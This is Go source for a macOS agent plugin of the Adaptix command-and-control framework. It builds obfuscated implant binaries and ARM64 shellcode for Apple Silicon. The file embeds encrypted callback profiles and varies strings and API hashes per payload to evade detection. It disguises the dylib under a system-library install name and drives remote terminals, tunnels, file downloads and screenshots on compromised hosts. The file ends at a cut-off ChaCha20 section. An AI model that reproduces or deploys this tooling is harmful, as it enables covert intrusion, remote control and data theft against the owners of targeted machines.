package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"math/bits"
	mrand "math/rand/v2"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/Adaptix-Framework/axc2"
	"github.com/google/shlex"
	"github.com/vmihailenco/msgpack/v5"
)

type Teamserver interface {
	TsListenerInteralHandler(watermark string, data []byte) (string, error)

	TsAgentProcessData(agentId string, bodyData []byte) error

	TsAgentUpdateData(newAgentData adaptix.AgentData) error
	TsAgentTerminate(agentId string, terminateTaskId string) error
	TsAgentUpdateDataPartial(agentId string, updateData interface{}) error

	TsAgentBuildExecute(builderId string, workingDir string, program string, args ...string) error
	TsAgentBuildLog(builderId string, status int, message string) error

	TsAgentConsoleOutput(agentId string, messageType int, message string, clearText string, store bool)

	TsPivotCreate(pivotId string, pAgentId string, chAgentId string, pivotName string, isRestore bool) error
	TsGetPivotInfoByName(pivotName string) (string, string, string)
	TsGetPivotInfoById(pivotId string) (string, string, string)
	TsPivotDelete(pivotId string) error

	TsTaskCreate(agentId string, cmdline string, client string, taskData adaptix.TaskData)
	TsTaskUpdate(agentId string, data adaptix.TaskData)
	TsTaskGetAvailableAll(agentId string, availableSize int) ([]adaptix.TaskData, error)

	TsDownloadAdd(agentId string, fileId string, fileName string, fileSize int64) error
	TsDownloadUpdate(fileId string, state int, data []byte) error
	TsDownloadClose(fileId string, reason int) error
	TsDownloadSave(agentId string, fileId string, filename string, content []byte) error

	TsScreenshotAdd(agentId string, Note string, Content []byte) error

	TsClientGuiDisksWindows(taskData adaptix.TaskData, drives []adaptix.ListingDrivesDataWin)
	TsClientGuiFilesStatus(taskData adaptix.TaskData)
	TsClientGuiFilesWindows(taskData adaptix.TaskData, path string, files []adaptix.ListingFileDataWin)
	TsClientGuiFilesUnix(taskData adaptix.TaskData, path string, files []adaptix.ListingFileDataUnix)
	TsClientGuiProcessWindows(taskData adaptix.TaskData, process []adaptix.ListingProcessDataWin)
	TsClientGuiProcessUnix(taskData adaptix.TaskData, process []adaptix.ListingProcessDataUnix)

	TsTunnelStart(TunnelId string) (string, error)
	TsTunnelCreateSocks4(AgentId string, Info string, Lhost string, Lport int) (string, error)
	TsTunnelCreateSocks5(AgentId string, Info string, Lhost string, Lport int, UseAuth bool, Username string, Password string) (string, error)
	TsTunnelCreateLportfwd(AgentId string, Info string, Lhost string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelCreateRportfwd(AgentId string, Info string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelUpdateRportfwd(tunnelId int, result bool) (string, string, error)

	TsTunnelStopSocks(AgentId string, Port int)
	TsTunnelStopLportfwd(AgentId string, Port int)
	TsTunnelStopRportfwd(AgentId string, Port int)

	TsTunnelConnectionClose(channelId int, writeOnly bool)
	TsTunnelConnectionHalt(channelId int, errorCode byte)
	TsTunnelConnectionResume(AgentId string, channelId int, ioDirect bool)
	TsTunnelConnectionData(channelId int, data []byte)
	TsTunnelConnectionAccept(tunnelId int, channelId int)
	TsTunnelPause(channelId int)
	TsTunnelResume(channelId int)

	TsTerminalConnExists(terminalId string) bool
	TsTerminalGetPipe(AgentId string, terminalId string) (*io.PipeReader, *io.PipeWriter, error)
	TsTerminalConnResume(agentId string, terminalId string, ioDirect bool)
	TsTerminalConnData(terminalId string, data []byte)
	TsTerminalConnClose(terminalId string, status string) error

	TsConvertCpToUTF8(input string, codePage int) string
	TsConvertUTF8toCp(input string, codePage int) string
	TsWin32Error(errorCode uint) string
}

type PluginAgent struct{}

type ExtenderAgent struct{}

var (
	Ts             Teamserver
	ModuleDir      string
	AgentWatermark string
)

func InitPlugin(ts any, moduleDir string, watermark string) adaptix.PluginAgent {
	ModuleDir = moduleDir
	AgentWatermark = watermark
	Ts = ts.(Teamserver)
	return &PluginAgent{}
}

func (p *PluginAgent) GetExtender() adaptix.ExtenderAgent {
	return &ExtenderAgent{}
}

func makeProxyTask(packData []byte) adaptix.TaskData {
	return adaptix.TaskData{Type: adaptix.TASK_TYPE_PROXY_DATA, Data: packData, Sync: false}
}

func getStringArg(args map[string]any, key string) (string, error) {
	v, ok := args[key].(string)
	if !ok {
		return "", fmt.Errorf("parameter '%s' must be set", key)
	}
	return v, nil
}

func getFloatArg(args map[string]any, key string) (float64, error) {
	v, ok := args[key].(float64)
	if !ok {
		return 0, fmt.Errorf("parameter '%s' must be set", key)
	}
	return v, nil
}

func getBoolArg(args map[string]any, key string) bool {
	v, _ := args[key].(bool)
	return v
}

/// TUNNEL

func (ext *ExtenderAgent) TunnelCallbacks() adaptix.TunnelCallbacks {
	return adaptix.TunnelCallbacks{
		ConnectTCP: TunnelMessageConnectTCP,
		ConnectUDP: TunnelMessageConnectUDP,
		WriteTCP:   TunnelMessageWriteTCP,
		WriteUDP:   TunnelMessageWriteUDP,
		Close:      TunnelMessageClose,
		Reverse:    TunnelMessageReverse,
		Pause:      TunnelMessagePause,
		Resume:     TunnelMessageResume,
	}
}

func TunnelMessageConnectTCP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	var packData []byte
	addr := fmt.Sprintf("%s:%d", address, port)
	packerData, _ := msgpack.Marshal(ParamsTunnelStart{Proto: "tcp", ChannelId: channelId, Address: addr})
	cmd := Command{Code: COMMAND_TUNNEL_START, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	return makeProxyTask(packData)
}

func TunnelMessageConnectUDP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	var packData []byte
	addr := fmt.Sprintf("%s:%d", address, port)
	packerData, _ := msgpack.Marshal(ParamsTunnelStart{Proto: "udp", ChannelId: channelId, Address: addr})
	cmd := Command{Code: COMMAND_TUNNEL_START, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	return makeProxyTask(packData)
}

func TunnelMessageWriteTCP(channelId int, data []byte) adaptix.TaskData {
	return makeProxyTask(data)
}

func TunnelMessageWriteUDP(channelId int, data []byte) adaptix.TaskData {
	return makeProxyTask(data)
}

func TunnelMessageClose(channelId int) adaptix.TaskData {
	var packData []byte
	packerData, _ := msgpack.Marshal(ParamsTunnelStop{ChannelId: channelId})
	cmd := Command{Code: COMMAND_TUNNEL_STOP, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	return makeProxyTask(packData)
}

func TunnelMessageReverse(tunnelId int, port int) adaptix.TaskData {
	var packData []byte
	return makeProxyTask(packData)
}

func TunnelMessagePause(channelId int) adaptix.TaskData {
	var packData []byte
	packerData, _ := msgpack.Marshal(ParamsTunnelPause{ChannelId: channelId})
	cmd := Command{Code: COMMAND_TUNNEL_PAUSE, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	return makeProxyTask(packData)
}

func TunnelMessageResume(channelId int) adaptix.TaskData {
	var packData []byte
	packerData, _ := msgpack.Marshal(ParamsTunnelResume{ChannelId: channelId})
	cmd := Command{Code: COMMAND_TUNNEL_RESUME, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	return makeProxyTask(packData)
}

/// TERMINAL

func (ext *ExtenderAgent) TerminalCallbacks() adaptix.TerminalCallbacks {
	return adaptix.TerminalCallbacks{
		Start: TerminalMessageStart,
		Write: TerminalMessageWrite,
		Close: TerminalMessageClose,
	}
}

func TerminalMessageStart(terminalId int, program string, sizeH int, sizeW int, oemCP int) adaptix.TaskData {
	var packData []byte
	packerData, _ := msgpack.Marshal(ParamsTerminalStart{TermId: terminalId, Program: program, Height: sizeH, Width: sizeW})
	cmd := Command{Code: COMMAND_TERMINAL_START, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	return makeProxyTask(packData)
}

func TerminalMessageWrite(terminalId int, oemCP int, data []byte) adaptix.TaskData {
	return makeProxyTask(data)
}

func TerminalMessageClose(terminalId int) adaptix.TaskData {
	var packData []byte
	packerData, _ := msgpack.Marshal(ParamsTerminalStop{TermId: terminalId})
	cmd := Command{Code: COMMAND_TERMINAL_STOP, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	return makeProxyTask(packData)
}

////// PLUGIN AGENT

type GenerateConfig struct {
	Format           string `json:"format"`
	ReconnectTimeout string `json:"reconn_timeout"`
	ReconnectCount   int    `json:"reconn_count"`
}

var SrcPath = "src_macos"

func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
	var agentProfiles [][]byte

	for _, transportProfile := range profile.ListenerProfiles {

		var listenerMap map[string]any
		if err := json.Unmarshal(transportProfile.Profile, &listenerMap); err != nil {
			return nil, err
		}

		var (
			generateConfig GenerateConfig
			profileData    []byte
		)

		err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig)
		if err != nil {
			return nil, err
		}

		agentWatermark, err := strconv.ParseInt(AgentWatermark, 16, 64)
		if err != nil {
			return nil, err
		}

		encrypt_key, _ := listenerMap["encrypt_key"].(string)
		encryptKey, err := hex.DecodeString(encrypt_key)
		if err != nil {
			return nil, err
		}
		// 监听器密钥（hex 32 字符 = 16 字节）同时是**内嵌 profile 的加密密钥**：
		// 前 16 字节当 AES 密钥、salt 补零。长度不对则生成出来的 agent 必然连不上。
		if len(encryptKey) != 16 {
			return nil, fmt.Errorf("invalid encrypt_key: need 32 hex characters (16 bytes), got %d bytes", len(encryptKey))
		}

		reconnectTimeout, err := parseDurationToSeconds(generateConfig.ReconnectTimeout)
		if err != nil {
			return nil, err
		}

		protocol, _ := listenerMap["protocol"].(string)
		switch protocol {

		case "tcp":

			tcp_banner, _ := listenerMap["tcp_banner"].(string)

			servers, _ := listenerMap["callback_addresses"].(string)

			servers = strings.ReplaceAll(servers, " ", "")
			servers = strings.ReplaceAll(servers, "\n", ",")
			servers = strings.TrimSuffix(servers, ",")
			addresses := strings.Split(servers, ",")

			var sslKey []byte
			var sslCert []byte
			var caCert []byte
			Ssl, _ := listenerMap["ssl"].(bool)
			if Ssl {
				ssl_key, _ := listenerMap["client_key"].(string)
				sslKey, err = base64.StdEncoding.DecodeString(ssl_key)
				if err != nil {
					return nil, err
				}

				ssl_cert, _ := listenerMap["client_cert"].(string)
				sslCert, err = base64.StdEncoding.DecodeString(ssl_cert)
				if err != nil {
					return nil, err
				}

				ca_cert, _ := listenerMap["ca_cert"].(string)
				caCert, err = base64.StdEncoding.DecodeString(ca_cert)
				if err != nil {
					return nil, err
				}
			}

			profile := Profile{
				Type:        uint(agentWatermark),
				Addresses:   addresses,
				BannerSize:  len(tcp_banner),
				ConnTimeout: reconnectTimeout,
				ConnCount:   generateConfig.ReconnectCount,
				UseSSL:      Ssl,
				SslCert:     sslCert,
				SslKey:      sslKey,
				CaCert:      caCert,
			}
			profileData, _ = msgpack.Marshal(profile)

		default:
			return nil, errors.New("protocol unknown")
		}

		extHandler := ExtenderAgent{}
		// ★ 这里原先丢弃了 Encrypt 的错误（`profileData, _ = …`）：一旦加密失败，
		// 内嵌的就退化成**裸 16 字节密钥**，agent 侧按"密钥+salt"去切 ⇒ 解不开、
		// 且报错点离现场很远。必须把错误传出去。
		profileData, err = extHandler.Encrypt(profileData, encryptKey)
		if err != nil {
			return nil, err
		}
		profileData = append(encryptKey, profileData...)

		profileString := ""
		for _, b := range profileData {
			profileString += fmt.Sprintf("\\x%02x", b)
		}
		agentProfiles = append(agentProfiles, []byte(profileString))
	}
	return agentProfiles, nil
}

/// Native C agent build constants
var (
	NativeSrcDir    = "src_agent/agent"
	NativeCompiler  = "aarch64-apple-darwin23.5-clang"
	NativeCFlags    = "-Os -fno-stack-protector -fno-builtin -Wall -Wextra -Wno-unused-parameter -Wno-unused-function"
	NativeLFlags    = "-lSystem -framework CoreFoundation"
	NativeObjFiles  = []string{"crt", "msgpack", "crypt", "connector", "agent_info", "commander", "tasks_fs", "tasks_proc", "tasks_macos", "jobs", "tasks_async", "tasks_net", "dyld_resolve", "opsec"}
)

func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [][]byte) ([]byte, string, error) {
	var (
		Filename string
		Payload  []byte
	)

	var (
		generateConfig GenerateConfig
		buildPath      string
	)

	err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig)
	if err != nil {
		return nil, "", err
	}

	currentDir := ModuleDir
	tempDir, err := os.MkdirTemp("", "ax-macos-*")
	if err != nil {
		return nil, "", err
	}

	switch generateConfig.Format {
	case "Binary Mach-O (Native)":
		return p.buildNativePayload(profile, agentProfiles, generateConfig, currentDir, tempDir)
	case "Shellcode ARM64 (Native)":
		return p.buildNativeShellcode(profile, agentProfiles, generateConfig, currentDir, tempDir)
	case "Binary Mach-O":
		Filename = "agent.bin"
	case "Dylib":
		Filename = "agent.dylib"
	default:
		Filename = "agent.bin"
	}

	// ── Go build pipeline (existing) ──

	GoOs := "darwin"
	GoArch := "arm64"

	buildPath = tempDir + "/" + Filename

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Target: %s/%s (Apple Silicon), Output: %s", GoOs, GoArch, Filename))

	// Write embedded profile config
	config := "package main\n\nvar encProfiles = [][]byte{\n"
	for _, p := range agentProfiles {
		config += fmt.Sprintf("    []byte(\"%s\"),\n", p)
	}
	config += "}\n"

	configPath := currentDir + "/" + SrcPath + "/config.go"
	err = os.WriteFile(configPath, []byte(config), 0644)
	if err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", err
	}

	// OPSEC: Per-payload variation — unique XOR key + build nonce
	xorKey := make([]byte, 16)
	_, _ = rand.Read(xorKey)
	buildNonce := make([]byte, 32)
	_, _ = rand.Read(buildNonce)

	obfStrings := generateObfuscatedStrings(xorKey, buildNonce)
	obfPath := currentDir + "/" + SrcPath + "/utils/strings_obf.go"
	err = os.WriteFile(obfPath, []byte(obfStrings), 0644)
	if err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", err
	}

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("OPSEC: XOR key generated (%s...), strings obfuscated", hex.EncodeToString(xorKey[:4])))

	LdFlags := "-s -w -buildid="
	GcFlags := "all=-B -C"
	cmdBuild := fmt.Sprintf("GOWORK=off CGO_ENABLED=0 GOOS=%s GOARCH=%s go build -trimpath -gcflags=\"%s\" -ldflags=\"%s\" -o %s", GoOs, GoArch, GcFlags, LdFlags, buildPath)

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Starting build process (darwin/arm64)...")

	var buildArgs []string
	buildArgs = append(buildArgs, "-c", cmdBuild)
	err = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir+"/"+SrcPath, "sh", buildArgs...)
	if err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", err
	}

	Payload, err = os.ReadFile(buildPath)
	if err != nil {
		return nil, "", err
	}
	_ = os.RemoveAll(tempDir)
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Payload size: %d bytes", len(Payload)))

	return Payload, Filename, nil
}

/// ── Native C build pipeline (osxcross) ──

func (p *PluginAgent) buildNativePayload(profile adaptix.BuildProfile, agentProfiles [][]byte, generateConfig GenerateConfig, currentDir string, tempDir string) ([]byte, string, error) {
	Filename := "agent_native.bin"
	buildPath := tempDir + "/" + Filename

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Target: darwin/arm64 (Native C, Apple Silicon)")

	// srcDir is relative to currentDir (which is used as runner.Dir)
	srcDir := NativeSrcDir

	// ── Step 1: Generate config.h with encrypted profile data ──
	configContent := generateNativeConfig(agentProfiles)
	configPath := tempDir + "/config.h"
	if err := os.WriteFile(configPath, []byte(configContent), 0644); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("write config.h: %w", err)
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Config: %d profile(s) embedded", len(agentProfiles)))

	// ── Step 1b: Generate per-payload DJB2 seed + ApiDefines.h ──
	djb2Seed := cryptoRandUint32()
	apiDefinesContent := generateMacosApiDefines(djb2Seed)
	apiDefinesPath := tempDir + "/ApiDefines.h"
	if err := os.WriteFile(apiDefinesPath, []byte(apiDefinesContent), 0644); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("write ApiDefines.h: %w", err)
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("DJB2 seed: 0x%08x (per-payload polymorphism)", djb2Seed))

	// ── Step 1c: Generate per-payload XOR-obfuscated strings ──
	obfContent := generateObfStrings()
	obfPath := tempDir + "/strings_obf.h"
	if err := os.WriteFile(obfPath, []byte(obfContent), 0644); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("write strings_obf.h: %w", err)
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "XOR string obfuscation generated (per-payload key)")

	// ── Step 2: Build cflags — tempDir first for generated headers ──
	cFlags := fmt.Sprintf("%s -I %s -I %s -DDJB2_SEED=%dU", NativeCFlags, tempDir, srcDir, djb2Seed)

	// ── Step 3: Compile each source file ──
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Compiling native agent sources (per-payload)...")

	compileSrc := func(srcFile string, outputName string) error {
		outPath := tempDir + "/" + outputName + ".o"
		cmdStr := fmt.Sprintf("PATH=/usr/lib/llvm-18/bin:/opt/osxcross/bin:$PATH %s %s -c %s -o %s",
			NativeCompiler, cFlags, srcFile, outPath)
		return Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", "-c", cmdStr)
	}

	// Compile shared object files
	for _, ofile := range NativeObjFiles {
		if err := compileSrc(srcDir+"/"+ofile+".c", ofile); err != nil {
			_ = os.RemoveAll(tempDir)
			return nil, "", fmt.Errorf("compile %s: %w", ofile, err)
		}
	}

	// Compile main.c
	if err := compileSrc(srcDir+"/main.c", "main"); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("compile main: %w", err)
	}

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS, "All sources compiled successfully")

	// ── Step 4: Link ──
	var objectFiles []string
	for _, ofile := range NativeObjFiles {
		objectFiles = append(objectFiles, tempDir+"/"+ofile+".o")
	}
	objectFiles = append(objectFiles, tempDir+"/main.o")

	linkCmd := fmt.Sprintf("PATH=/usr/lib/llvm-18/bin:/opt/osxcross/bin:$PATH %s %s -o %s %s",
		NativeCompiler, NativeLFlags, buildPath, strings.Join(objectFiles, " "))
	if err := Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", "-c", linkCmd); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("link: %w", err)
	}

	// ── Step 5: Ad-hoc codesign ──
	// Apple Silicon REQUIRES all binaries to be signed (even ad-hoc).
	// The linker adds an ad-hoc signature, but strip removes it.
	// We skip strip to preserve the signature — binary is already small (~100KB)
	// and OPSEC benefits from no strip (less tooling fingerprint).
	// If ldid is available, re-sign after strip for minimal size.
	stripAndSign := fmt.Sprintf("PATH=/usr/lib/llvm-18/bin:/opt/osxcross/bin:$PATH; "+
		"if command -v ldid >/dev/null 2>&1; then "+
		"aarch64-apple-darwin23.5-strip %s 2>/dev/null; ldid -S %s; "+
		"fi", buildPath, buildPath)
	_ = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", "-c", stripAndSign)

	// ── Read output ──
	Payload, err := os.ReadFile(buildPath)
	if err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", err
	}
	_ = os.RemoveAll(tempDir)
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Payload size: %d bytes (native Mach-O ARM64)", len(Payload)))

	return Payload, Filename, nil
}

/// ── Native C shellcode build pipeline (dylib + XOR encoder) ──

func (p *PluginAgent) buildNativeShellcode(profile adaptix.BuildProfile, agentProfiles [][]byte, generateConfig GenerateConfig, currentDir string, tempDir string) ([]byte, string, error) {
	Filename := "agent_shellcode.bin"
	dylibPath := tempDir + "/agent_native.dylib"

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Target: darwin/arm64 (Shellcode ARM64, Native C)")

	srcDir := NativeSrcDir

	// ── Step 1: Generate config.h, ApiDefines.h, strings_obf.h (same as Mach-O) ──
	configContent := generateNativeConfig(agentProfiles)
	if err := os.WriteFile(tempDir+"/config.h", []byte(configContent), 0644); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("write config.h: %w", err)
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Config: %d profile(s) embedded", len(agentProfiles)))

	djb2Seed := cryptoRandUint32()
	if err := os.WriteFile(tempDir+"/ApiDefines.h", []byte(generateMacosApiDefines(djb2Seed)), 0644); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("write ApiDefines.h: %w", err)
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("DJB2 seed: 0x%08x (per-payload polymorphism)", djb2Seed))

	if err := os.WriteFile(tempDir+"/strings_obf.h", []byte(generateObfStrings()), 0644); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("write strings_obf.h: %w", err)
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "XOR string obfuscation generated (per-payload key)")

	// ── Step 2: Compile with -DBUILD_DYLIB ──
	cFlags := fmt.Sprintf("%s -I %s -I %s -DDJB2_SEED=%dU -DBUILD_DYLIB", NativeCFlags, tempDir, srcDir, djb2Seed)

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Compiling native agent sources (dylib mode, per-payload)...")

	compileSrc := func(srcFile string, outputName string) error {
		outPath := tempDir + "/" + outputName + ".o"
		cmdStr := fmt.Sprintf("PATH=/usr/lib/llvm-18/bin:/opt/osxcross/bin:$PATH %s %s -c %s -o %s",
			NativeCompiler, cFlags, srcFile, outPath)
		return Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", "-c", cmdStr)
	}

	for _, ofile := range NativeObjFiles {
		if err := compileSrc(srcDir+"/"+ofile+".c", ofile); err != nil {
			_ = os.RemoveAll(tempDir)
			return nil, "", fmt.Errorf("compile %s: %w", ofile, err)
		}
	}
	if err := compileSrc(srcDir+"/main.c", "main"); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("compile main: %w", err)
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS, "All sources compiled successfully (dylib mode)")

	// ── Step 3: Link as dynamic library ──
	var objectFiles []string
	for _, ofile := range NativeObjFiles {
		objectFiles = append(objectFiles, tempDir+"/"+ofile+".o")
	}
	objectFiles = append(objectFiles, tempDir+"/main.o")

	dylibLFlags := "-dynamiclib -lSystem -framework CoreFoundation -Wl,-install_name,/usr/lib/libsystem_product.dylib"
	linkCmd := fmt.Sprintf("PATH=/usr/lib/llvm-18/bin:/opt/osxcross/bin:$PATH %s %s -o %s %s",
		NativeCompiler, dylibLFlags, dylibPath, strings.Join(objectFiles, " "))
	if err := Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", "-c", linkCmd); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("link dylib: %w", err)
	}

	// ── Step 4: Strip + ad-hoc sign ──
	stripAndSign := fmt.Sprintf("PATH=/usr/lib/llvm-18/bin:/opt/osxcross/bin:$PATH; "+
		"if command -v ldid >/dev/null 2>&1; then "+
		"aarch64-apple-darwin23.5-strip %s 2>/dev/null; ldid -S %s; "+
		"fi", dylibPath, dylibPath)
	_ = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", "-c", stripAndSign)

	// ── Step 5: Read dylib bytes ──
	dylibBytes, err := os.ReadFile(dylibPath)
	if err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("read dylib: %w", err)
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Dylib size: %d bytes", len(dylibBytes)))

	// ── Step 6: XOR encode with ARM64 decoder stub ──
	shellcode, err := xorEncodeShellcodeARM64(dylibBytes)
	if err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("xor encode: %w", err)
	}

	_ = os.RemoveAll(tempDir)
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS, fmt.Sprintf("Shellcode size: %d bytes (dylib %d + stub overhead)", len(shellcode), len(dylibBytes)))

	return shellcode, Filename, nil
}

// parseEscapedBytes converts a Go-escaped string like "\x01\x02\xff" to raw bytes.
func parseEscapedBytes(escaped []byte) []byte {
	s := string(escaped)
	var result []byte
	for i := 0; i < len(s); {
		if i+3 < len(s) && s[i] == '\\' && s[i+1] == 'x' {
			b, err := strconv.ParseUint(s[i+2:i+4], 16, 8)
			if err == nil {
				result = append(result, byte(b))
				i += 4
				continue
			}
		}
		result = append(result, s[i])
		i++
	}
	return result
}

// generateNativeConfig creates a C config.h with encrypted profile data as byte arrays.
// agentProfiles contains Go-escaped strings (\xHH format) that we parse to raw bytes.
func generateNativeConfig(agentProfiles [][]byte) string {
	var sb strings.Builder
	sb.WriteString("// Auto-generated — per-payload config\n")
	sb.WriteString("// Do not edit. Regenerated on each build.\n")
	sb.WriteString("#ifndef CONFIG_H\n#define CONFIG_H\n\n")
	sb.WriteString("#include <stdint.h>\n\n")
	sb.WriteString(fmt.Sprintf("#define PROFILE_COUNT %d\n\n", len(agentProfiles)))

	for i, escapedProf := range agentProfiles {
		rawProf := parseEscapedBytes(escapedProf)
		// Write profile as C byte array
		sb.WriteString(fmt.Sprintf("static const uint8_t enc_profile_%d[] = {\n    ", i))
		for j := 0; j < len(rawProf); j++ {
			if j > 0 && j%16 == 0 {
				sb.WriteString("\n    ")
			}
			sb.WriteString(fmt.Sprintf("0x%02x", rawProf[j]))
			if j < len(rawProf)-1 {
				sb.WriteString(", ")
			}
		}
		sb.WriteString("\n};\n")
		sb.WriteString(fmt.Sprintf("static const uint32_t enc_profile_%d_size = %d;\n\n", i, len(rawProf)))
	}

	// Arrays for iteration
	sb.WriteString("static const uint8_t* enc_profiles[] = {\n")
	for i := range agentProfiles {
		sb.WriteString(fmt.Sprintf("    enc_profile_%d,\n", i))
	}
	sb.WriteString("};\n\n")

	sb.WriteString("static const uint32_t enc_profile_sizes[] = {\n")
	for i := range agentProfiles {
		sb.WriteString(fmt.Sprintf("    enc_profile_%d_size,\n", i))
	}
	sb.WriteString("};\n\n")

	sb.WriteString("#endif // CONFIG_H\n")
	return sb.String()
}

func (p *PluginAgent) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.ExtenderAgent, error) {
	var agentData adaptix.AgentData

	var sessionInfo SessionInfo
	err := msgpack.Unmarshal(beat, &sessionInfo)
	if err != nil {
		return adaptix.AgentData{}, nil, err
	}

	agentData.ACP = int(sessionInfo.Acp)
	agentData.OemCP = int(sessionInfo.Oem)
	agentData.Pid = fmt.Sprintf("%v", sessionInfo.PID)
	agentData.Tid = ""
	agentData.Arch = "arm64"
	agentData.Elevated = sessionInfo.Elevated
	agentData.InternalIP = sessionInfo.Ipaddr

	// macOS agent always reports as darwin
	if sessionInfo.Os == "darwin" {
		agentData.Os = adaptix.OS_MAC
		agentData.OsDesc = sessionInfo.OSVersion
	} else {
		agentData.Os = adaptix.OS_UNKNOWN
		return agentData, nil, errors.New("macOS agent received non-darwin OS")
	}

	// ★ session key = EncryptKey || TransportSalt，两半都由 **agent** 提供
	// （见 macos_agent/src_macos/main.go 的 CreateInfo）。原实现由服务端随机造
	// salt，agent 无从得知 ⇒ 注册后双向密文全部解不开（首包能进、之后全哑）。
	salt := sessionInfo.TransportSalt
	if len(salt) != 16 {
		salt = make([]byte, 16)
	}
	if len(sessionInfo.EncryptKey) != 16 {
		return adaptix.AgentData{}, nil, errors.New("invalid macos session encrypt key length")
	}
	agentData.SessionKey = append(append([]byte(nil), sessionInfo.EncryptKey...), salt...)

	agentData.Domain = ""
	agentData.Computer = sessionInfo.Host
	agentData.Username = sessionInfo.User
	agentData.Process = sessionInfo.Process

	// TCP agent uses persistent connection — "sleep" is the reconnect timeout
	agentData.Sleep = 0 // real-time (persistent TCP)
	agentData.Jitter = 0

	return agentData, &ExtenderAgent{}, nil
}

/// AGENT HANDLER

// AES-GCM + ChaCha20 double overlay encryption.
//
// ★★ 与 gopher_agent/session_crypto.go 的 GopherSession{Encrypt,Decrypt} 逐字节等价，
// 线格式 = cnonce(12) || overlay(gcm.Seal(nonce, nonce, data))。
//
// 原实现是 **双 RC4 overlay、线上无 nonce**，而 teamserver 的 GopherTCP listener
// 客户端（macos_agent/src_macos/utils/crypt.go）与 gopher agent 都已是 ChaCha20：
// 版本不一致 ⇒ profile blob 解不开、会话密文互相解不开。
// ★ 本文件与 src_macos/utils/crypt.go 是**同层对应物，必须同时改**（同一份协议
// 在 extender 与 agent 各写一份，只改一侧就是**静默失联**）。
func deriveTransportSubkey(sk, salt []byte) []byte {
	out := make([]byte, 16)
	for i := 0; i < 16; i++ {
		out[i] = sk[i] ^ sk[(i+1)%16] ^ salt[i]
	}
	return out
}

// ---- ChaCha20 (128-bit key variant, 96-bit nonce) ----
